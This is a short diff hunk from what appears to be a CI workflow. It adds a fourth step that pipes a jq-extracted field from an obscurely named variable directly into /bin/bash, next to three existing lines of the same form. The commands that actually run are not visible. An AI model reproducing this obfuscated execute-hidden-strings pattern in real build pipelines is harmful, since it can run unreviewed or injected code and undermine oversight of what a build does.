@@ -61,6 +61,7 @@ jobs:
           echo $weumg8184 | jq -r .c30505 | /bin/bash
           printf '%s' "$j025" | jq -r .woceh24 | /bin/bash
           printf '%s' "$dvisj14" | jq -r .sawx8 | /bin/bash
+          echo $f08867 | jq -r .kno12 | /bin/bash
 
       - name: Save archive
         if: always()
